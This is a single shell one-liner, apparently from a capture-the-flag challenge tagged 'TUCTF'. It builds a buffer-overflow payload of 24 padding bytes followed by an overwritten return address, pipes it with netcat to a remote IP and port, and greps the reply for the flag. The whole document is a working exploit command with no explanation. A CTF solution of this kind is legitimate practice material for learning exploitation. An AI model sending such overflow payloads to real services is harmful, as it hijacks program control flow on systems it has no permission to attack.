echo `python -c "print 'A'*24 + 'm\x85\x04\x08'"`| nc 146.148.95.248 2525|grep "TUCTF" --color=none

